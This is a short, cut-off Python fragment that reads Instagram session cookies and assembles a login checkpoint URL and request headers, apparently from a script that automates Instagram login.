def Secure():
    global cookie_jar, csrf_token
    ig_nrcb = cookie_jar['ig_nrcb']
    ig_did = cookie_jar['ig_did']
    mid = cookie_jar['mid']
    sec_url='https://www.instagram.com'+json_login['checkpoint_url']
    head2 = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
